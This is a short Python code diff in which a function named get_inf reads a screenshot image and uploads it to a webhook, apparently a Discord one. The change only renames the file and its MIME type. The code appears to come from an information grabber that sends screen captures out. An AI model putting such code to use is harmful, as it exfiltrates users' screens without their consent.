@@ -23,7 +23,7 @@ def get_inf(webhook):
 
     with open(image_path, "rb") as f:
         image_data = f.read()
-        encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('screenshot.jpg', image_data, 'screenshot/jpg')})
+        encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})
 
     headers = {'Content-Type': encoder.content_type}
     response = requests.post(webhook, headers=headers, data=encoder.to_string())
